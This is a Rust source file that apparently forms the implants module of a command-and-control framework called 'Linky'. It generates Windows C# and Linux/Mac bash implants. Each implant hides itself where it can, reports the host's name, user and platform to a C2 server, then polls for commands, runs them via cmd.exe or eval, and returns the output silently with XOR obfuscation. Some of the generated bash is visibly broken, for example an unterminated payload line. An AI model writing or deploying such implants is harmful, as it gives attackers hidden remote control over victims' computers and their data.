// Implants Module - Windows, Linux, and Mac implants

use serde::{Deserialize, Serialize};
use std::path::PathBuf;

use std::fs;

use crate::utils::{generate_implant_id, base64_encode};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ImplantConfig {
    pub server_address: String,
    pub port: u16,
    pub use_https: bool,
    pub encryption_key: String,
    pub implant_id: String,
}

pub fn generate_windows_implant(output_path: PathBuf, server_address: String) -> Result<(), Box<dyn std::error::Error>> {
    let implant_id = generate_implant_id();
    let config = ImplantConfig {
        server_address: server_address.clone(),
        port: 8443,
        use_https: true,
        encryption_key: "default-encryption-key-12345".to_string(),
        implant_id: implant_id.clone(),
    };

    let windows_code = generate_windows_implant_code(&config)?;
    fs::write(output_path, windows_code)?;
    
    Ok(())
}

pub fn generate_linux_implant(output_path: PathBuf, server_address: String) -> Result<(), Box<dyn std::error::Error>> {
    let implant_id = generate_implant_id();
    let config = ImplantConfig {
        server_address: server_address.clone(),
        port: 8443,
        use_https: true,
        encryption_key: "default-encryption-key-12345".to_string(),
        implant_id: implant_id.clone(),
    };

    let linux_code = generate_linux_implant_code(&config)?;
    fs::write(output_path, linux_code)?;
    
    Ok(())
}

pub fn generate_mac_implant(output_path: PathBuf, server_address: String) -> Result<(), Box<dyn std::error::Error>> {
    let implant_id = generate_implant_id();
    let config = ImplantConfig {
        server_address: server_address.clone(),
        port: 8443,
        use_https: true,
        encryption_key: "default-encryption-key-12345".to_string(),
        implant_id: implant_id.clone(),
    };

    let mac_code = generate_mac_implant_code(&config)?;
    fs::write(output_path, mac_code)?;
    
    Ok(())
}

fn generate_windows_implant_code(config: &ImplantConfig) -> Result<String, Box<dyn std::error::Error>> {
    let config_json = serde_json::to_string(config)?;
    let encoded_config = base64_encode(config_json.as_bytes());
    
    let code = format!(r#"
using System;
using System.Net;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class LinkyImplant {{
    private static string config = "{0}";
    private static string implantId;
    private static string serverUrl;
    private static string encryptionKey;
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();
    
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    const int SW_HIDE = 0;
    
    public static void Main() {{
        // Hide console window
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        
        // Decode configuration
        DecodeConfig();
        
        // Main implant loop
        while (true) {{
            try {{
                Register();
                CheckIn();
                GetTasks();
            }} catch (Exception ex) {{
                // Silent failure
            }}
            
            // Sleep for 10 seconds
            Thread.Sleep(10000);
        }}
    }}
    
    private static void DecodeConfig() {{
        try {{
            byte[] configBytes = Convert.FromBase64String(config);
            string configJson = Encoding.UTF8.GetString(configBytes);
            dynamic configObj = Newtonsoft.Json.JsonConvert.DeserializeObject(configJson);
            
            implantId = configObj.implant_id;
            serverUrl = (configObj.use_https ? "https" : "http") + "://" + configObj.server_address + ":" + configObj.port;
            encryptionKey = configObj.encryption_key;
        }} catch {{
            // Fallback defaults
            implantId = "implant-" + Guid.NewGuid().ToString();
            serverUrl = "https://localhost:8443";
            encryptionKey = "default-encryption-key-12345";
        }}
    }}
    
    private static void Register() {{
        try {{
            var client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "application/json";
            
            var implantData = new {{
                hostname = Environment.MachineName,
                username = Environment.UserName,
                platform = Environment.OSVersion.ToString(),
                implant_id = implantId
            }};
            
            string payload = Newtonsoft.Json.JsonConvert.SerializeObject(new {{
                message_type = "Register",
                implant_id = implantId,
                payload = Newtonsoft.Json.JsonConvert.SerializeObject(implantData),
                timestamp = DateTime.UtcNow.ToString("o")
            }});
            
            string encrypted = Encrypt(payload, encryptionKey);
            string response = client.UploadString(serverUrl + "/api/register", "POST", encrypted);
        }} catch {{
            // Silent failure
        }}
    }}
    
    private static void CheckIn() {{
        try {{
            var client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "application/json";
            
            string payload = Newtonsoft.Json.JsonConvert.SerializeObject(new {{
                message_type = "CheckIn",
                implant_id = implantId,
                payload = "{{\"status\":\"active\"}}",
                timestamp = DateTime.UtcNow.ToString("o")
            }});
            
            string encrypted = Encrypt(payload, encryptionKey);
            string response = client.UploadString(serverUrl + "/api/checkin", "POST", encrypted);
        }} catch {{
            // Silent failure
        }}
    }}
    
    private static void GetTasks() {{
        try {{
            var client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "application/json";
            
            string payload = Newtonsoft.Json.JsonConvert.SerializeObject(new {{
                message_type = "TaskRequest",
                implant_id = implantId,
                payload = "{}",
                timestamp = DateTime.UtcNow.ToString("o")
            }});
            
            string encrypted = Encrypt(payload, encryptionKey);
            string response = client.UploadString(serverUrl + "/api/task", "POST", encrypted);
            
            // Decrypt response
            string decrypted = Decrypt(response, encryptionKey);
            dynamic responseObj = Newtonsoft.Json.JsonConvert.DeserializeObject(decrypted);
            
            if (responseObj.status == "success") {{
                foreach (var task in responseObj.tasks) {{
                    ExecuteTask(task);
                }}
            }}
        }} catch {{
            // Silent failure
        }}
    }}
    
    private static void ExecuteTask(dynamic task) {{
        try {{
            string command = task.command;
            string taskId = task.id;
            
            // Execute command
            string result = ExecuteCommand(command);
            
            // Send result
            var client = new WebClient();
            client.Headers[HttpRequestHeader.ContentType] = "application/json";
            
            string payload = Newtonsoft.Json.JsonConvert.SerializeObject(new {{
                message_type = "TaskResponse",
                implant_id = implantId,
                payload = Newtonsoft.Json.JsonConvert.SerializeObject(new {{
                    task_id = taskId,
                    result = result,
                    status = "completed"
                }}),
                timestamp = DateTime.UtcNow.ToString("o")
            }});
            
            string encrypted = Encrypt(payload, encryptionKey);
            string response = client.UploadString(serverUrl + "/api/result", "POST", encrypted);
        }} catch {{
            // Silent failure
        }}
    }}
    
    private static string ExecuteCommand(string command) {{
        try {{
            var process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.WaitForExit();
            
            return output + error;
        }} catch (Exception ex) {{
            return "Error: " + ex.Message;
        }}
    }}
    
    private static string Encrypt(string text, string key) {{
        // Simple XOR encryption for demo purposes
        byte[] textBytes = Encoding.UTF8.GetBytes(text);
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        byte[] result = new byte[textBytes.Length];
        
        for (int i = 0; i < textBytes.Length; i++) {{
            result[i] = (byte)(textBytes[i] ^ keyBytes[i % keyBytes.Length]);
        }}
        
        return Convert.ToBase64String(result);
    }}
    
    private static string Decrypt(string encrypted, string key) {{
        return Encrypt(encrypted, key); // XOR is symmetric
    }}
}}
"#, encoded_config);
    
    Ok(code)
}

fn generate_linux_implant_code(config: &ImplantConfig) -> Result<String, Box<dyn std::error::Error>> {
    let config_json = serde_json::to_string(config)?;
    let encoded_config = base64_encode(config_json.as_bytes());
    
    let code = format!(r#"#!/bin/bash

# Linky Linux Implant
# Configuration (base64 encoded)
CONFIG="{}"

# Decode configuration
decode_config() {{
    local decoded=$(echo "$CONFIG" | base64 -d 2>/dev/null)
    if [ $? -ne 0 ]; then
        # Fallback defaults
        IMPLANT_ID="implant-$(uuidgen)"
        SERVER_URL="https://localhost:8443"
        ENCRYPTION_KEY="default-encryption-key-12345"
    else
        IMPLANT_ID=$(echo "$decoded" | grep -o '"implant_id":"[^"]*"' | cut -d'"' -f4)
        SERVER_ADDRESS=$(echo "$decoded" | grep -o '"server_address":"[^"]*"' | cut -d'"' -f4)
        SERVER_PORT=$(echo "$decoded" | grep -o '"port":[0-9]*' | grep -o '[0-9]*')
        USE_HTTPS=$(echo "$decoded" | grep -o '"use_https":[^,]*')
        ENCRYPTION_KEY=$(echo "$decoded" | grep -o '"encryption_key":"[^"]*"' | cut -d'"' -f4)
        
        if [ "$USE_HTTPS" = "true" ]; then
            SERVER_URL="https://$SERVER_ADDRESS:$SERVER_PORT"
        else
            SERVER_URL="http://$SERVER_ADDRESS:$SERVER_PORT"
        fi
    fi
}}

# Encrypt function
encrypt() {{
    local text="$1"
    local key="$2"
    echo -n "$text" | xxd -p | tr -d '\n' | fold -w2 | while read -r byte; do
        local text_byte=$(printf "%d" 0x$byte)
        local key_byte=$(printf "%d" 0x$(echo -n "$key" | xxd -p | tr -d '\n' | cut -c$(({{COUNTER}}%{{#key_bytes}}*2+1))-$(({{COUNTER}}%{{#key_bytes}}*2+2))))
        local result=$((text_byte ^ key_byte))
        printf "%02x" $result
        COUNTER=$((COUNTER+1))
    done | xxd -r -p | base64 -w0
}}

# Decrypt function (same as encrypt for XOR)
decrypt() {{
    local encrypted="$1"
    local key="$2"
    echo "$encrypted" | base64 -d | xxd -p | tr -d '\n' | fold -w2 | while read -r byte; do
        local encrypted_byte=$(printf "%d" 0x$byte)
        local key_byte=$(printf "%d" 0x$(echo -n "$key" | xxd -p | tr -d '\n' | cut -c$(({{COUNTER}}%{{#key_bytes}}*2+1))-$(({{COUNTER}}%{{#key_bytes}}*2+2))))
        local result=$((encrypted_byte ^ key_byte))
        printf "%02x" $result
        COUNTER=$((COUNTER+1))
    done | xxd -r -p
}}

# Register with C2 server
register() {{
    local hostname=$(hostname)
    local username=$(whoami)
    local platform=$(uname -a)
    
    local payload=$(echo '{\"message_type\":\"Register\",\"implant_id\":\"%s\",\"payload\":{\"hostname\":\"%s\",\"username\":\"%s\",\"platform\":\"%s\"},\"timestamp\":\"%s\"}' \
    
    local encrypted=$(encrypt "$payload" "$ENCRYPTION_KEY")
    curl -s -X POST "$SERVER_URL/api/register" \
        -H "Content-Type: application/json" \
        -d "$encrypted" > /dev/null
}}

# Check in with C2 server
checkin() {{
    local payload=$(echo "{\"message_type\":\"CheckIn\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{\"status\":\"active\"},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
    
    local encrypted=$(encrypt "$payload" "$ENCRYPTION_KEY")
    curl -s -X POST "$SERVER_URL/api/checkin" \
        -H "Content-Type: application/json" \
        -d "$encrypted" > /dev/null
}}

# Get tasks from C2 server
get_tasks() {{
    local payload=$(echo "{\"message_type\":\"TaskRequest\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
    
    local encrypted=$(encrypt "$payload" "$ENCRYPTION_KEY")
    local response=$(curl -s -X POST "$SERVER_URL/api/task" \
        -H "Content-Type: application/json" \
        -d "$encrypted")
    
    if [ -n "$response" ]; then
        local decrypted=$(decrypt "$response" "$ENCRYPTION_KEY")
        local status=$(echo "$decrypted" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
        
        if [ "$status" = "success" ]; then
            # Extract tasks and execute them
            local tasks=$(echo "$decrypted" | sed 's/.*"tasks":\([^]]*\].*/\1/')
            echo "$tasks" | grep -o '{"[^}]*"}' | while read -r task; do
                local task_id=$(echo "$task" | grep -o '"id":"[^"]*"' | cut -d'"' -f4)
                local command=$(echo "$task" | grep -o '"command":"[^"]*"' | cut -d'"' -f4 | sed 's/\\\\/\\/g')
                
                # Execute command
                local result=$(eval "$command" 2>&1)
                
                # Send result back
                local result_payload=$(echo "{\"message_type\":\"TaskResponse\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{\"task_id\":\"$task_id\",\"result\":\"$(echo "$result" | sed 's/"/\\"/g')\",\"status\":\"completed\"},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
                
                local result_encrypted=$(encrypt "$result_payload" "$ENCRYPTION_KEY")
                curl -s -X POST "$SERVER_URL/api/result" \
                    -H "Content-Type: application/json" \
                    -d "$result_encrypted" > /dev/null
            done
        fi
    fi
}}

# Main loop
decode_config

while true; do
    register
    checkin
    get_tasks
    sleep 10
done
"#, encoded_config);
    
    Ok(code)
}

fn generate_mac_implant_code(config: &ImplantConfig) -> Result<String, Box<dyn std::error::Error>> {
    let config_json = serde_json::to_string(config)?;
    let encoded_config = base64_encode(config_json.as_bytes());
    
    let code = format!(r#"#!/bin/bash

# Linky Mac Implant (similar to Linux but with Mac-specific commands)
# Configuration (base64 encoded)
CONFIG="{}"

# Decode configuration
decode_config() {{
    local decoded=$(echo "$CONFIG" | base64 -d 2>/dev/null)
    if [ $? -ne 0 ]; then
        # Fallback defaults
        IMPLANT_ID="implant-$(uuidgen)"
        SERVER_URL="https://localhost:8443"
        ENCRYPTION_KEY="default-encryption-key-12345"
    else
        IMPLANT_ID=$(echo "$decoded" | grep -o '"implant_id":"[^"]*"' | cut -d'"' -f4)
        SERVER_ADDRESS=$(echo "$decoded" | grep -o '"server_address":"[^"]*"' | cut -d'"' -f4)
        SERVER_PORT=$(echo "$decoded" | grep -o '"port":[0-9]*' | grep -o '[0-9]*')
        USE_HTTPS=$(echo "$decoded" | grep -o '"use_https":[^,]*')
        ENCRYPTION_KEY=$(echo "$decoded" | grep -o '"encryption_key":"[^"]*"' | cut -d'"' -f4)
        
        if [ "$USE_HTTPS" = "true" ]; then
            SERVER_URL="https://$SERVER_ADDRESS:$SERVER_PORT"
        else
            SERVER_URL="http://$SERVER_ADDRESS:$SERVER_PORT"
        fi
    fi
}}

# Encrypt function
encrypt() {{
    local text="$1"
    local key="$2"
    echo -n "$text" | xxd -p | tr -d '\n' | fold -w2 | while read -r byte; do
        local text_byte=$(printf "%d" 0x$byte)
        local key_byte=$(printf "%d" 0x$(echo -n "$key" | xxd -p | tr -d '\n' | cut -c$(({{COUNTER}}%{{#key_bytes}}*2+1))-$(({{COUNTER}}%{{#key_bytes}}*2+2))))
        local result=$((text_byte ^ key_byte))
        printf "%02x" $result
        COUNTER=$((COUNTER+1))
    done | xxd -r -p | base64 -w0
}}

# Decrypt function (same as encrypt for XOR)
decrypt() {{
    local encrypted="$1"
    local key="$2"
    echo "$encrypted" | base64 -d | xxd -p | tr -d '\n' | fold -w2 | while read -r byte; do
        local encrypted_byte=$(printf "%d" 0x$byte)
        local key_byte=$(printf "%d" 0x$(echo -n "$key" | xxd -p | tr -d '\n' | cut -c$(({{COUNTER}}%{{#key_bytes}}*2+1))-$(({{COUNTER}}%{{#key_bytes}}*2+2))))
        local result=$((encrypted_byte ^ key_byte))
        printf "%02x" $result
        COUNTER=$((COUNTER+1))
    done | xxd -r -p
}}

# Register with C2 server
register() {{
    local hostname=$(scutil --get ComputerName)
    local username=$(whoami)
    local platform=$(sw_vers -productVersion)
    
    local payload=$(echo "{\"message_type\":\"Register\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{\"hostname\":\"$hostname\",\"username\":\"$username\",\"platform\":\"$platform\"},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
    
    local encrypted=$(encrypt "$payload" "$ENCRYPTION_KEY")
    curl -s -X POST "$SERVER_URL/api/register" \
        -H "Content-Type: application/json" \
        -d "$encrypted" > /dev/null
}}

# Check in with C2 server
checkin() {{
    local payload=$(echo "{\"message_type\":\"CheckIn\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{\"status\":\"active\"},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
    
    local encrypted=$(encrypt "$payload" "$ENCRYPTION_KEY")
    curl -s -X POST "$SERVER_URL/api/checkin" \
        -H "Content-Type: application/json" \
        -d "$encrypted" > /dev/null
}}

# Get tasks from C2 server
get_tasks() {{
    local payload=$(echo "{\"message_type\":\"TaskRequest\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
    
    local encrypted=$(encrypt "$payload" "$ENCRYPTION_KEY")
    local response=$(curl -s -X POST "$SERVER_URL/api/task" \
        -H "Content-Type: application/json" \
        -d "$encrypted")
    
    if [ -n "$response" ]; then
        local decrypted=$(decrypt "$response" "$ENCRYPTION_KEY")
        local status=$(echo "$decrypted" | grep -o '"status":"[^"]*"' | cut -d'"' -f4)
        
        if [ "$status" = "success" ]; then
            # Extract tasks and execute them
            local tasks=$(echo "$decrypted" | sed 's/.*"tasks":\([^]]*\].*/\1/')
            echo "$tasks" | grep -o '{"[^}]*"}' | while read -r task; do
                local task_id=$(echo "$task" | grep -o '"id":"[^"]*"' | cut -d'"' -f4)
                local command=$(echo "$task" | grep -o '"command":"[^"]*"' | cut -d'"' -f4 | sed 's/\\\\/\\/g')
                
                # Execute command
                local result=$(eval "$command" 2>&1)
                
                # Send result back
                local result_payload=$(echo "{\"message_type\":\"TaskResponse\",\"implant_id\":\"$IMPLANT_ID\",\"payload\":{\"task_id\":\"$task_id\",\"result\":\"$(echo "$result" | sed 's/"/\\"/g')\",\"status\":\"completed\"},\"timestamp\":\"$(date -u +%Y-%m-%dT%H:%M:%SZ)"}")
                
                local result_encrypted=$(encrypt "$result_payload" "$ENCRYPTION_KEY")
                curl -s -X POST "$SERVER_URL/api/result" \
                    -H "Content-Type: application/json" \
                    -d "$result_encrypted" > /dev/null
            done
        fi
    fi
}}

# Main loop
decode_config

while true; do
    register
    checkin
    get_tasks
    sleep 10
done
"#, encoded_config);
    
    Ok(code)
}